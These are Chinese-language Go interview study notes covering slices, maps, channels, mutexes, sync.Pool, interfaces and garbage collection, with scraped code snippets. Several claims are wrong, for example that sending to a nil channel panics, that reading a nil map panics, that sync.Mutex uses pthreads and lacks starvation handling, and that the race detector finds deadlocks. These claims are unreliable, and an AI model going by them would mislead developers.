emptyCtx），直接返回一个 nil。所以用 Value 方法的时候要判断结果是否为 nil。父节点没法获取子节点存储的值，子节点却可以获取父节点的值。 waitgroup的原理和场景【多个groutine的等待结束/并发控制】 内部维护了一个计数器，初始化为0。 调用 Add 方法时，计数器会增加； 每当调用 Done 方法时，计数器会减少； 调用 Wait 方法时，如果计数器不为零，则会阻塞当前 Goroutine，直到计数器减至零。 string和byte的转换发生内存拷贝吗【会】为什么？string底层是一个不可变的字符数组，执行[]byte(str)，拷贝完，之前分配的空间被gc 为什么go协程堵掉不会阻塞，C++的线程堵掉【C++的线程pthread是内核态，Go的调度时runtime系统管理的，相当于套了一层壳，运行在用户态，但是有内核态的速度,然后goroutine堵掉会通过GPM模型的handoff机制移交给其他的M去执行 除了mutex还有什么方法实现并发安全atomic包和channel mutex和RWmutex的区别 可重入性：mutex不是可重入锁，Mutex 不会记录持有锁的协程的信息，所以它也无法区分是不是重入这种场景。 读写锁的读锁可重入，写锁不可以锁的正常和饥饿状态这个runtime系统解释一下golang 的 runtime 在 golang 中的地位类似于 Java 的虚拟机。包括 GPM模型 GC机制 内存分配：Go 程序在启动时，会首先向系统申请一块内存(虚拟地址空间)，然后自己切成小块进行管理. 将申请的内存，分成 3 个区域,spans、bitmap、arena123arena: 就是堆区，go runtime 在动态分配的内存都在这个区域，并且将内存块分成 8kb 的页，一些组合起来的称为 **mspan，**成为 go 中内存管理的基本单元，这种连续的页一般是操作系统的内存页几倍大小.bitmap: 顾名思义，用来标记堆区使用的映射表，它记录了哪些区域保存了对象，对象是否包含指针，以及 GC 的标记信息.spans: 存放 mspan 的指针，根据 spans 区域的信息可以很容易找到 mspan. 它可以在 GC 时更快速的找到的大块的内存 mspan. 1.go的数组和切片 数组是固定长度的，切片是可以变化的 切片实际是对数组的封装，切片底层是由指向数组的指针，切片长度，切片容量三个参数组成。指向底层数组的指针就标志着切片的开始 切片是对底层数组的一个引用，不同的切片可以指向同一个底层数组，操纵同一个底层数组。 需要注意的几点 传递切片作为函数参数，其实拷贝的是切片这个结构体，会产生一个新的切片结构体实例，指向同一个底层数组。虽然也会改变底层数组得值，但是对于原来的切片来说，是没有任何变化的，只是对应的底层数组中某些元素的值变了。 切片进行append扩容的时候，会产生新的切片地址，所以要将append函数返回的值重新赋给切片 Go1.18不再以1024为临界点，而是设定了一个值为256的threshold，以256为临界点；超过256，不再是每次扩容1/4，而是每次增加（旧容量+3256）/4； 当新切片需要的容量cap大于两倍扩容的容量，则直接按照新切片需要的容量扩容； 当原 slice 容量 &lt; threshold 的时候，新 slice 容量变成原来的 2 倍； 当原 slice 容量 &gt; threshold，进入一个循环，每次容量增加（旧容量+3threshold）/4。 需要注意切片是对数组的引用, 所以当切片被赋值给别的切片变量时, 改变新的切片变量中的值, 会连带改变原切片值 2.读已经关闭的channel发生什么 读已关闭的channel 读已经关闭的channel无影响。 如果在关闭前，通道内部有元素，会正确读到元素的值； 如果关闭前通道无元素，则会读取到通道内元素类型对应的零值。 若遍历通道，如果通道未关闭，读完元素后，会报死锁的错误。会引发fatal error: all goroutines are asleep - deadlock! 写已关闭的通道会引发panic: send on closed channel 关闭已关闭的通道会引发panic: close of closed channel 需要注意的几点：对于一个已初始化，但并未关闭的通道来说，收发操作一定不会引发 panic。但是通道一旦关闭，再对它进行发送操作，就会引发 panic。如果我们试图关闭一个已经关闭了的通道，也会引发 panic。 12345678910111213141516171819202122232425262728293031323334353637//1. 读一个已经关闭的通道func main() &#123; channel := make(chan int, 10) channel &lt;- 2 close(channel) x := &lt;-channel fmt.Println(x)&#125;/*[Output]: 不会报错，输出2*/// 遍历读关闭通道func main() &#123; channel := make(chan int, 10) channel &lt;- 2 channel &lt;- 3 close(channel) //若不关闭通道，则会报死锁错误 for num := range channel &#123; fmt.Println(num) &#125;&#125;/*[Output]: 不会报错，输出2 3*///2. 写一个已经关闭的通道func main() &#123; channel := make(chan int, 10) close(channel) channel &lt;- 1&#125;/*[Output]: panic: send on closed channel*///3. 关闭一个已经关闭的管道func main() &#123; channel := make(chan int, 10) close(channel) close(channel)&#125;/*[Output]: panic: close of closed channel */ 3.Go是如何实现继承的通过struct的组合实现的继承 13.map取一个key，修改这个key，原map会更改吗【会，是引用类型】从map中取出一个值并对其进行修改时，原始的map也会受到影响，因为map是引用类型，它们在底层是指向相同的数据结构的指针 引用类型：map slice channel interface 【*不可以边遍历边修改元素】 16. struct能否==比较【可以】，成员里有struct呢？【可以】 但是只能1.相同类型结构体，2.成员结构相同并且都是可比较类型 但切片、映射和函数等类型无法比较25. go的深浅拷贝 浅拷贝: person1 := person2 ，拷贝后的数据是原来数据的引用，更改后原来的也会改 深拷贝: person3 := Person{name : person1.name}，独立的对象29. 如何判断channel是否关闭 _, ok := &lt;- mych 30. make 和 new 的区别 make创建、初始化引用类型 new返回的是一个类型的指针，只有创建没有初始化，可以用于任何数据31. Slice的append扩容，每次达到阈值会扩容大改 1/444. goroutine获取不到锁会一直等待吗【当然会】58. 空结构体用来干嘛【占位符，某个集合的存在性检查】60. defer用来干什么【释放锁，关协程，关channel，文件，recover panic】61. context包的作用【并发安全】 处理网络请求和并发任务时常用，处理请求范围内的值传递、取消和超时等问题， 并发安全，可以在多个goroutine中共享 传递信号给goroutine，进行管理 传递请求范围内的值 64. panic如何恢复 当程序遇到一个 panic，它会立即停止当前函数的执行，并沿着调用栈一直向上传播，直到到达 recover 所在的延迟函数。 如果在defer 中调用了 recover，它会停止 panic 的传播并返回 panic 的值。 如果没有发生 panic，recover 会返回 nil123456789func recoverExample() &#123; defer func() &#123; if r := recover(); r != nil &#123; fmt.Println(\"Recovered:\", r) &#125; &#125;() // 引发 panic panic(\"something went wrong\")&#125; 【多协程】 子协程A的panic，B能否捕获到？【不可以，但是对其他协程不影响】 主协程能捕获子协程吗【也不能，因为只有协程自己内部的 recover 才能捕获自己抛出的 panic】 70. go的init函数何时执行的 导包初始化的时候执行，多个init时，都会执行 一个文件里有多个init时，根据包的导入关系决定 在包内有多个init，init执行顺序，golang没有明确定义，字典序？72. Gin的路由如何实现【压缩版的前缀树路由，httprouter库】 74. struct的传递场景：大struct避免复制，用浅拷贝79. sync.Pool 对象池用来干嘛的，应用场景如何 它用于存储和复用临时对象，以减少内存分配和垃圾回收的开销。 适用于需要频繁创建和销毁对象的场景 一些高并发场景，频繁创建和销毁一些对象 协程池，数据库连接池，http连接池 临时缓冲区12345678原理如下1. 每个 sync.Pool 实例内部维护了两个 interface&#123;&#125; 类型的字段，一个用于存储临时对象（私有私有的 local 对象池），另一个用于存储共享对象（共享的 shared 对象池）。2. 当你调用 pool.Get() 方法时，sync.Pool 会首先尝试从当前 Goroutine 的私有对象池 local 中获取一个对象。3. 如果 local 中没有可用的对象，它会转而尝试从共享对象池 shared 中获取一个对象。4. 如果 shared 中也没有可用的对象，它会调用 New 函数创建一个新的对象。5. 当你调用 pool.Put(obj) 方法时，对象会被放回到当前 Goroutine 的私有对象池 local 中。6. 如果私有对象池 local 已满，或者对象过期，那么该对象会被丢弃。这个机制保证了对象会在同一个 Goroutine 中被复用，从而减少了对象的创建和垃圾回收的开销。 sync.pool怎么实现的私有对象池和共享对象池+互斥锁保证线程安全,通过get和put 12345type poolLocal struct &#123; private interface&#123;&#125; shared []interface&#123;&#125; M sync.Mutex&#125; 83. 变量申请类型是为了做什么类型就是根据不同的数据类型可以存储不同的数据，所以需要申请对应类型地址数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请 88. Go的GC机制介绍一下84. Go和Java的GC机制有什么区别 目前主流的Java虚拟机实现都采用了分代垃圾回收的思想，堆内存被划分为新生代和年老代两部分，新生代主要使用复制和标记-清除垃圾回收，年老代主要使用标记-整理垃圾回收算法 然后go的垃圾回收是混合写屏障机制，stw的时间更短，1.3用的标记清除，1.5改为用三色标记，但是还需要stw扫描栈所以就演进为混合写屏障，栈上新增对象都为黑色，暂时活过这一轮，然后删除的对象为灰色或者白色，节点都会变为灰色，黑色节点下新增节点都为灰色 java语言中选择了可达性分析进行对象存活判断，而不是引用计数，主要也是因为java中软引用、弱引用、虚引用等多种引用方式使用引用计数并不能进行有效的存活判断，同时为了避免循环引用的问题，所以java选择了可达性分析的方式进行对象存活判断。 在java中触发垃圾回收的条件是： cpu空闲的时候； 在堆栈满了的时候； 主动调用 System.gc() 后尝试进行回收； Go的gc最佳应用场景是自身的分配行为不容易导致碎片堆积，并且程序分配新对象的速度不太高的情况，这种情况下go的垃圾回收比java更高效。相反的，当对象分配速度高时，java的gc的优势就会明显体现 102. 什么时候触发线程切换 阻塞 时间片用完 显式调用 runtime.Gosched():主动让出当前 Goroutine 的执行权限，让调度器选择另一个可运行的 Goroutine 执行 互斥锁 等待组 sync.WaitGroup()107. http库的设计原理是什么？为什么不池化？采用的是连接池：http 包会自动维护一个连接池，用于复用 TCP 连接，从而提升性能。 不池化的原因：处理的对象不一样，场景也不一样 对象池管理创建、销毁常用对象，减少gc压力 连接池是复用连接，减少资源分配的开销，连接池中的资源通常会被长时间地重复使用，而对象池中的对象可能在短时间内就会被释放 110. 关闭一个已关闭的channel会发生什么？【panic】110/238. 有缓存channel和没缓存channel的区别是什么？无缓冲的与有缓冲 channel 有着重大差别，那就是一个是同步的 一个是非同步的 116/138. 类型断言 t := i.(T)，这个表达式可以断言一个接口对象（i）里不是 nil，并且接口对象（i）存储的值的类型是 T，如果断言成功，就会返回值给 t，如果断言失败，就会触发 panic t, ok:= i.(T)，这个表达式也是可以断言一个接口对象（i）里不是 nil，并且接口对象（i）存储的值的类型是 T，如果断言成功，就会返回其类型给 t，并且此时 ok 的值 为 true，表示断言成功。这个不会触发 panic，而是将 ok 的值设为 false ，表示断言失败，此时t 为 T 的零值。8.channel的实现方式/原理/概念/底层实现 117. 实现一种等待或者监听的机制【使用select channel，或者time.sleep】118. sleep的底层实现？slice的append返回一个新切片会发生什么 append不超threshold，底层引用的数组还是原来的地址 超过了的话，原来的和新的都会指向新数组 120/137/291. interface的底层实现 带有方法的interface，一种是不带方法的interface 任何一个interface变量都是占用16个byte的内存空间 第一个字段 _type指针，指向数据类型，runtime中的每个数据类型都包含一个这样的字段 1234567891011121314151617181920212223242526272829303132333435363738394041// 没有方法的interfacetype eface struct &#123; _type *_type //重要字段，记录着某种数据类型的一些基本特征，比如这个数据类型占用的内存大小（size字段），数据类型的名称（nameOff字段）等等 // 每种数据类型都存在一个与之对应的_type结构体 data unsafe.Pointer&#125;// 有方法的interfacetype iface struct &#123; tab *itab data unsafe.Pointer&#125;// 记录着Go语言中某个数据类型的基本特征type _type struct &#123; size uintptr ptrdata uintptr hash uint32 tflag tflag align uint8 fieldalign uint8 kind uint8 alg *typeAlg gcdata *byte str nameOff ptrToThis typeOff&#125;type itab struct &#123; inter *interfacetype _type *_type //重要 link *itab hash uint32 bad bool inhash bool unused [2]byte fun [1]uintptr&#125; // interface数据类型对应的typetype interfacetype struct &#123; typ _type pkgpath name mhdr []imethod&#125; 404. defer的底层实现160. string的底层实现121. STW 在 go 的哪些阶段发生？1.8的改进是什么【混合写】标记和清理阶段都会发生 132. 如何避免panic133. 结构体对齐优化内存对齐:CPU访问内存时，通过字来访问，一个字在32位cpu中4个字节，所以对于 1234567891011struct demo&#123; a int8 //1 b int32//4 c int16 //2&#125;会变成 1+3 + 2+2 + 4 字节，而下面会变成 3+1 + 4struct demo&#123; a int8 //1 b int16//2 c int32//4&#125; 244. go实现func自定义参数type myFunc func(int) int 252. copy是操作符还是内置函数【内置函数，深拷贝】290. 解释一下Go的通信机制是通过channel实现的，chan定义实现了环形队列，总是遵循先入先出（First In First Out）的规则，保证收发数据的顺序，这一点和管道是一样的；chan在实现时定义了: 指针 环形队列 (阻塞)协程链表来控制通信，当chan满足条件时，通过指针sendx 、recvx 进行读写数据。 296. slice函数传参，先赋值再append与先append再赋值，哪个发生了改变【先赋值的改变了，因为先append的地址发生了改变】123456789101112func appendThenAssign(arr []int) &#123; arr = append(arr, 3) arr[0] = 99&#125;func assignThenAppend(arr []int) &#123; arr[0] = 99 arr = append(arr, 3)&#125;appendThenAssign(arr)//print arr: 1 2assignThenAppend(arr)//print arr: 99 2 297. 有没有什么线程安全的办法？互斥锁信号量，条件变量原子操作线程安全的库 golang http包的内存泄漏情况 忘记关闭response的 body 忘记释放连接，或者一直创建连接，没有有效复用的情况？ 306. go map的时间复杂度307. go由源码变二进制代码的整个流程309. select poll epoll314. make底层原理315. string 强转 []byte 发生了什么底层的不可变字符数组拷贝到byte类型的内存，然后原来的内存被gc掉 335/411. go的包管理工具除了go mod还有什么 go mod能下载和管理指定版本的库，实现高效的模块化开发，和管理依赖关系的功能 go sum干什么的：提供了安全机制 块路径：列出了项目中所使用的所有直接依赖模块的路径。 版本号：对应每个模块的版本号。 哈希值：对应每个模块版本的哈希值，用于确保模块的代码完整性。356. 介绍一下go的反射typeof和valueof来实现，每个类型，包括符合类型都维护了一个type和value区域 396. go的 oop 面向对象与传统面向对象的区别go是用结构体定义对象，然后通过组合实现继承，对于多态来说，go强调接口的使用 397. go里面interface对于java的接口和c++的虚函数区别在哪 Go 接口是隐式实现的，一个类型只要实现了接口中的所有方法，就被认为是实现了该接口，无需显式声明。这种方式让 Go 具有了更大的灵活性。 Go 倾向于使用接口和返回错误值的方式来处理错误，而不是像 Java 或者 C++ 中那样使用异常 402. Go runtime的程序计数器，为什么是私有的（为什么程序猿不能操作） 在 Go 的 runtime 中，程序计数器用于跟踪当前 Goroutine 正在执行的代码位置，从而支持 Goroutine 的并发执行。 在单线程情况下，程序计数器会指向当前 Goroutine 执行的代码块。当发生 Goroutine 切换时，程序计数器的值会保存到当前 Goroutine 的上下文中，然后加载新 Goroutine 的上下文中的程序计数器值，以便从上次中断的地方继续执行。 避免混乱，保护Groutine在并发环境下的完整性 423. interface和nil可以比较吗【可以】但是必须要类型和值都相同 果接口变量的动态值和动态类型同时都为 nil，那么接口变量将与 nil 比较相等。 如果类型和值有一个不为nil，那么就是不相等 447. struct组合与java继承有什么区别 相同点是，都是静态语言，在编译期实现 go组合支持多继承，java需要extends 父类来继承，只能继承一个 448. go的强制类型转换与隐式类型转换Go 支持两种类型转换： var a int = 10，var b float64 = float64(a) 将整数 a 转换为浮点数。 在算术表达式中，如果操作符两侧的类型不一致，Go 会自动将其中一个值转换为与另一个值相同的类型。 451. 多个interface间可以存在什么关系组合，嵌套都可以 一个接口可以嵌套在另一个接口内部，这种情况下，外部接口会继承内部接口的所有方法 一个接口可以由多个其他接口组合而成，组合后的接口将具有所有组成接口的方法510. go方法和函数的区别方法是定义了 Receiver 的函数，分为receiver Value Receiver，不会修改receiver的内容 Pointer Receiver，会修改receiver的内容 512. Go函数返回局部变量的指针是否安全【安全，发生内存逃逸，监测到没使用的时候就GC掉】5.Go的GMP模型6.Go和Java相比9.同一个goroutine里面，对无缓冲channel同时发送和接收数据有什么问题导致死锁 10.channel和锁的对比11.channel的应用场景12.227. go实现一个链表289. 写一个将字符串json转成一个可用的map的函数，json的value类型可能不定Slice专题455. 内置cap函数可以用于？【arrary slice channel】的capability计算为什么map不能用cap来计算： map因为有bucket，在内存存放的大小可能不和make出来的大小一致。是编译器计算后的结果， 463. 切片扩容机制扩容是为切片分配新的内存空间并复制原切片中元素的过程。先确定新的切片大致容量而分配内存空间，根据该切片当前容量选择不同的策略：【旧】 如果期望容量大于当前容量的两倍，就会使用期望容量 如果当前切片的长度小于 1024，容量就会翻倍 如果当前切片的长达大于 1024，每次扩容 25% 的容量，直到新容量大于期望容量。 roundupsize 函数来确定待申请的内存，该函数会从一个数组中获取整数，使用这个数组中的元素可以提高内存分配效率并减少碎片，这个数组叫做 NumSizeClasses 。 520. Slice为什么不是线程安全的因为他是引用类型，其他指针可以同时指向底层数组，而且没有同步的措施 443. slice底层，内存泄漏分析1）发生场景：截取长slice中的一段导致长slice未释放。 由于底层都是数组，如果截图长slice的一段，其实相当于引用了底层数组中的一小段。只要还有引用，golang的gc就不能回收数组。这种情况导致未使用的数组空间，未及时回收。 ​解决方案：新建一个长度为0的slice，将需要的一小段slice使用append方法添加到新的slice。再将原来的slice置为nil。 2）发生场景：没有重置丢失的子切片元素中的指针 没有及时将不再使用的slice置为nil ​解决方案：如果slice中包含很多元素，再只有一小部分元素需要使用的情况下。建议重新分配一个slice将需要保留的元素加入其中，将原来的长slice整个置为nil。 Map专题32. 如何实现一个线程安全的maphttps://github.com/guowei-gong/go-demo/blob/main/mutex/demo.go 加读写锁 分片加锁 sync.Map（很少用） 场景一：只会增长的缓存系统，一个 key 值写入一次而被读很多次； 场景二：多个 goroutine 为不相交的键读、写和重写键值对。 channel做串行访问:通过将 map 的读写操作发送到一个单独的 Goroutine 中，使得对 map 的访问变成串行的，从而避免了竞态条件。123456789101112131415161718192021222324package mainvar m = make(map[int]int)var ch = make(chan func())func read(key int) int &#123; var result int ch &lt;- func() &#123; result = m[key] &#125; return result&#125;func write(key, val int) &#123; ch &lt;- func() &#123; m[key] = val &#125;&#125;func main() &#123; write(1, 10) value := read(1) println(value) // 输出 10&#125; 34. Map的底层实现使用Hash表和搜索树作为底层实现,底层是一个hmap和一个bmap bmap被称之为“桶”。一个桶里面会最多装 8 个 key，key 经过哈希计算后，哈希结果是“一类”的将会落入到同一个桶中。在桶内，会根据key计算出来的hash值的高 8 位来决定key到底落入桶内的哪个位置。 这也是为什么map无法使用cap()来求容量的关键原因：map的容量是编译器进行计算后得出的一个结果，由于桶的存在，map在内存中实际存放的大小不一定同make出来后的map的大小一致。 123456789101112131415161718192021222324type hmap struct &#123; count int //元素个数，调用len(map)时直接返回 flags uint8 //标志map当前状态,正在删除元素、添加元素..... B uint8 //单元(buckets)的对数 B=5表示能容纳32个元素 noverflow uint16 //单元(buckets)溢出数量，如果一个单元能存8个key，此时存储了9个，溢出了，就需要再增加一个单元 hash0 uint32 //哈希种子 buckets unsafe.Pointer //指向单元(buckets)数组,大小为2^B，可以为nil oldbuckets unsafe.Pointer //扩容的时候，buckets长度会是oldbuckets的两倍 nevacute uintptr //指示扩容进度，小于此buckets迁移完成 extra *mapextra //与gc相关 可选字段&#125;// A bucket for a Go map.type bmap struct &#123; tophash [bucketCnt]uint8&#125;//实际上编译期间会生成一个新的数据结构type bmap struct &#123; topbits [8]uint8 keys [8]keytype values [8]valuetype pad uintptr overflow uintptr&#125; 36. map的key可以是哪些类型，可以是nil吗？nil不可以，嵌套不可以 可以作为 map 的键的类型必须满足相等性比较的条件，包括基本数据类型和一些自定义类型，string必然可以 不可以做key的类型：切片，函数，包含切片和函数的符合类型 36. struct{} interface{} nil可以做map的key吗 nil不可以，其他的可以 struct{} 以值的字面量形式去比较 interface{} 以动态类型去比较 1234567891011121314151617m := make(map[interface&#123;&#125;]int)m[1] = 10m[\"string\"] = 20m[3.14] = 30fmt.Println(m[1]) // 输出 10fmt.Println(m[\"string\"]) // 输出 20fmt.Println(m[3.14]) // 输出 30//m := make(map[struct&#123;&#125;]int)key1 := struct&#123;&#125;&#123;&#125;key2 := struct&#123;&#125;&#123;&#125;m[key1] = 10m[key2] = 20fmt.Println(m[key1]) // 输出 10fmt.Println(m[key2]) // 输出 20 251. sync.Map 怎么解决线程安全问题？源码看过吗支持并发读写，采取了 “空间换时间” 的机制，冗余了两个数据结构，分别是：read 和 dirty. 优点是读多写少场景下使用，比如只会增长的缓存 缺点是写多场景下，导致 read map 缓存失效，需要加锁，冲突变多，性能急剧下降 和原始map+RWLock的实现并发的方式相比，减少了加锁对性能的影响。它做了一些优化：可以无锁访问read map，而且会优先操作read map，倘若只操作read map就可以满足要求，那就不用去操作write map(dirty)，所以在某些特定场景中它发生锁竞争的频率会远远小于map+RWLock的实现方式 123456type Map struct &#123; mu Mutex read atomic.Value // readOnly dirty map[interface&#123;&#125;]*entry misses int&#125; 275 map的分段锁拆了几个分片？379. 如果一个map没申请空间，去向里面取值【发生panic】一般用的时候就给他make一个stuct{}{}空类型 407. map取一个key，然后修改这个值，原来的数据会发生变化吗？【会】引用类型526. map的负载因子是多少【6.5】为什么？默认当 map 中的元素个数达到总容量的 65% 时，会触发扩容操作。为什么？ channel9.同一个协程里面，对无缓冲channel同时进行读写会发生什么问题原则上不可以这样写，会导致死锁。 对于一个无缓冲的channel而言，只有不同的协程之间一方发送数据一方接受数据才不会阻塞。channel无缓冲时，发送阻塞直到数据被接收，接收阻塞直到读到数据。 14.向为nil的channel发送数据会怎样【发生panic】为什么连续两次close(ch)会发生panic: runtime err51. channel 线程安全吗【安全】里面有互斥锁互斥锁是如何起作用的： 在对循环数组buf中的数据进行入队和出队操作时，必须先获取互斥锁，才能操作channel数据。 【重点】分布式session如何实现https://juejin.cn/post/6965665934165950495 golang是用redis实现的，启动redis-trib.rb spring cloud可以用原生的分布式session支持 98/99. 分布式锁有哪些？如何用channel实现？基于数据库的分布式锁 使用数据库的事务特性来实现分布式锁，通过在数据库中创建一个唯一索引或者唯一约束来保证锁的唯一性。 基于Redis的分布式锁,非阻塞的trylock 使用 Redis 提供的 SETNX（SET if Not eXists）指令，可以在 Redis 中创建一个分布式锁。 基于etcd的分布式锁，阻塞的等待lock 使用 etcd 提供的分布式锁实现，可以实现分布式系统中的互斥访问。 基于ZooKeeper的分布式锁 使用 ZooKeeper 提供的临时有序节点和监视机制，可以实现分布式锁。 1234567891011121314151617181920212223242526272829303132package mainimport \"fmt\"var ( lockCh = make(chan struct&#123;&#125;, 1) // 带缓冲的 channel，容量为1表示只能同时有一个 Goroutine 获取到锁 locked = false // 标记是否已经获取到锁)func acquireLock() bool &#123; select &#123; case lockCh &lt;- struct&#123;&#125;&#123;&#125;: locked = true return true default: return false &#125;&#125;func releaseLock() &#123; if locked &#123; &lt;-lockCh locked = false &#125;&#125;func main() &#123; if acquireLock() &#123; defer releaseLock() // 临界区代码 fmt.Println(\"Lock acquired!\") &#125; else &#123; fmt.Println(\"Failed to acquire lock\") &#125;&#125; 174. go 里的 sync的Lock 和 channel 的性能区别134. channel实现一个排序算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package mainimport \"fmt\"func bubbleSort(nums []int, ch chan int) &#123; n := len(nums) for i := 0; i &lt; n-1; i++ &#123; swapped := false for j := 0; j &lt; n-i-1; j++ &#123; if nums[j] &gt; nums[j+1] &#123; nums[j], nums[j+1] = nums[j+1], nums[j] swapped = true &#125; &#125; if !swapped &#123; break &#125; &#125; ch &lt;- 1 // 排序完成，向通道发送信号&#125;func main() &#123; nums := []int&#123;4, 3, 1, 5, 2&#125; ch := make(chan int) go bubbleSort(nums[:len(nums)/2], ch) // 在一个 Goroutine 中排序前半部分 go bubbleSort(nums[len(nums)/2:], ch) // 在另一个 Goroutine 中排序后半部分 // 等待两个 Goroutine 完成 &lt;-ch &lt;-ch // 合并两个有序数组 merged := merge(nums[:len(nums)/2], nums[len(nums)/2:]) fmt.Println(merged)&#125;func merge(left, right []int) []int &#123; result := make([]int, len(left)+len(right)) i, j, k := 0, 0, 0 for i &lt; len(left) &amp;&amp; j &lt; len(right) &#123; if left[i] &lt;= right[j] &#123; result[k] = left[i] i++ &#125; else &#123; result[k] = right[j] j++ &#125; k++ &#125; for i &lt; len(left) &#123; result[k] = left[i] i++ k++ &#125; for j &lt; len(right) &#123; result[k] = right[j] j++ k++ &#125; return result&#125; 202. channel 实现一个限流器在每次循环中，我们先向 limiter channel 发送当前时间，如果 channel 已满（达到了最大并发数），则会阻塞等待。接着，启动一个新的协程来执行操作，当操作执行完毕后，通过匿名函数中的 defer 语句从 channel 中接收一个值，表示释放一个协程的位置。 473. channel的ring buffer 适用FIFO，recvx 指向最早被读取的数 据，sendx 指向再次写入时插入的位置 go的同步库15. sync.waitgroup的坑① Add一个负数 如果计数器的值小于0会直接panic ② Add在Wait之后调用 比如一些子协程开头调用Add结束调用Wait，这些 Wait无法阻塞子协程。正确做法是在开启子协程之前先Add特定的值。 ③ 未置为0就重用 WaitGroup可以完成一次编排任务，计数值降为0后可以继续被其他任务所用，但是不要在还没使用完的时候就用于其他任务，这样由于带着计数值，很可能出问题。 ④ 复制waitgroup WaitGroup有nocopy字段，不能被复制。也意味着WaitGroup不能作为函数的参数。 18. 读写锁怎么实现的 读写锁内部是通过互斥锁实现的,主要应用于写操作少，读操作多的场景。 goroutine获得写锁时，其他读写都会阻塞，读锁相互之间不会阻塞，当所有读锁释放后，才可以获取写锁读锁可重入，写锁不可重入原理：121. 基于一个计数器和两个队列2. RLOCK WLOCK 114. mutex 如何处理正常和饥饿状态？rwmutex中写操作如何处理写操作阻止读操作正常模式和饥饿状态： 正常状态下，Mutex 的锁是公平的，当一个 Goroutine 尝试获取锁时，如果锁已经被其他 Goroutine 持有，那么它将被放入一个等待队列中，直到锁被释放。 饥饿状态指的是某些 Goroutine 一直无法获得锁，而其他 Goroutine 不断获得锁的情况。在 Go 中，sync.Mutex 并没有专门的机制来处理饥饿状态。如果出现饥饿状态，通常是由于程序逻辑设计不合理导致的，可能需要重新考虑并发结构和资源的设计。 读写操作 如果一个 Goroutine 持有写锁，那么其他 Goroutine 将无法获取读锁，直到写锁被释放。这种机制保证了在写操作进行时，不会有其他 Goroutine 进行并发的读取操作，从而避免了数据的并发写入。 33. go的锁是可重入的吗【不是】可重入锁（也称为递归锁）是指允许同一个线程或 Goroutine 多次获取同一个锁，而不会发生死锁的情况。这在一些场景下是很有用的，比如在一个函数中多次调用其他需要锁保护的函数 但是go的sync.Mutex不是可重入。 210. 如何检测死锁的？ go vet 进行静态分析 go run/build -race 可以检测死锁，在编译好静态文件后 211. 怎么处理锁分段（Lock Sharding） 锁分段是将一个大锁拆分成多个小锁，每个小锁只保护一部分共享资源，从而减小锁的粒度，提高并发度。 使用锁分段的优点在于它可以将大锁拆分成多个小锁，提高并发性能，特别是在高并发的情况下。然而，需要注意的是在设计分段锁时，需要考虑到资源的访问模式和分段的粒度，以避免出现性能瓶颈或竞争条件1234567891011121314151617181920212223242526type LockShard struct &#123; locks []sync.Mutex&#125;//初始化锁分段init lock shardfunc NewLockShard(numShards int) *LockShard &#123; shard := &amp;LockShard&#123; locks: make([]sync.Mutex, numShards), &#125; return shard&#125;//确定分段索引func (ls *LockShard) GetShardIndex(key string) int &#123; // 根据 key 计算出分段索引 // ... return shardIndex&#125;// 取和释放分段锁func (ls *LockShard) Lock(key string) &#123; shardIndex := ls.GetShardIndex(key) ls.locks[shardIndex].Lock()&#125;func (ls *LockShard) Unlock(key string) &#123; shardIndex := ls.GetShardIndex(key) ls.locks[shardIndex].Unlock()&#125; 226. sync.mutex的底层实现（Linux） 实现可能因操作系统和硬件平台而异 使用 pthreads 库（POSIX 线程库）中的互斥锁实现。 这是一个用户态的锁，它会使用操作系统提供的系统调用来进行加锁和解锁 mutex维护一个state，类型是int32 提供了两种锁定方式：阻塞锁和自旋锁 阻塞锁：当一个 Goroutine 尝试获取一个被其他 Goroutine 持有的锁时，它会被阻塞，直到锁被释放。 自旋锁：自旋锁是一种非阻塞的锁机制，在尝试获取锁时，如果锁已经被其他 Goroutine 持有，它会在一段时间内快速尝试获取锁，而不是被阻塞。如果在一定时间内无法获取到锁，那么它会转为阻塞模式。 mutex允许自旋的条件是什么【执行状态的M个数&lt; mapprocs】开发者可以使用 runtime.GOMAXPROCS() 函数来设置 Goroutine 的最大并发数，从而影响自旋锁的行为。 goroutine使用20. 两个goroutine交替打印字母和数字123456789101112131415161718192021222324252627282930313233343536package mainimport ( \"fmt\")func main() &#123; limit := 26 numChan := make(chan int, 1) charChan := make(chan int, 1) mainChan := make(chan int, 1) charChan &lt;- 1 go func() &#123; for i := 0; i &lt; limit; i++ &#123; &lt;-charChan fmt.Printf(\"%c\\n\", 'a'+i) numChan &lt;- 1 &#125; &#125;() go func() &#123; for i := 0; i &lt; limit; i++ &#123; &lt;-numChan fmt.Println(i) charChan &lt;- 1 &#125; mainChan &lt;- 1 &#125;() &lt;-mainChan close(charChan) close(numChan) close(mainChan)&#125; 26. 为什么不要大量使用goroutine 上下文切换，开销变大 可能会存在内存泄漏的问题，得要根据具体的情况来评估并发的需求，避免不必要的并发，以免引入不必要的复杂性和潜在的问题。 协程池如何实现 worker40. for 循环多次执行goroutine 有什么坑？ go支持闭包， 如果用了循环的这个i，里面的变量就可能出错，用临时变量的副本比较好。 Goroutine 是异步执行的，它们可能会在循环变量发生变化之后才开始执行，导致不确定的结果 48. 如果要等待所有goroutine结束，怎么做？【使用waitgroup】55. goroutine为什么轻量独立的栈空间 每个 Goroutine 都有自己独立的栈空间，相对于传统的线程来说，Goroutines 的栈空间通常会小很多。这使得创建和销毁 Goroutines 更加快速和节省内存。 灵活的调度器 Go 的运行时（runtime）包含了一个高效的调度器，它可以在多个操作系统线程上调度 Goroutines，以便充分利用多核处理器的优势。这使得在单个程序中可以同时执行大量的 Goroutines，而不会导致线程过度切换和资源浪费。 快速的启动和停止 相对于传统的线程，创建和销毁 Goroutines 更加快速。这使得在需要短暂执行某些任务时，使用 Goroutines 更为合适。 共享的堆空间 所有 Goroutines 共享相同的堆空间，这意味着它们可以相对容易地共享数据，而不需要显式的同步机制。 通信通过通道 Goroutines 之间的通信主要依赖于通道（channel），它们提供了一种安全且高效的方式来传递数据。通过通道，可以实现 Goroutines 之间的同步和数据传递，而无需显式的锁。 自动的垃圾回收 Go 具有垃圾回收机制，它会自动管理内存的分配和释放，使得开发者无需手动管理内存，降低了并发程序中内存泄漏的风险。 85. 使用两个channel实现a+b92. goroutine的实现方式100. 并行goroutine如何实现111. 父 goroutine 退出，如何使得子goroutine也退出【waitgroup 用channel ，defer】 父 Goroutine 退出时，只要main不退出，所有的子 Goroutines 不会强制关闭 Go的GC机制24. go的gc什么是否触发主动触发(手动触发)，通过调用 runtime.GC 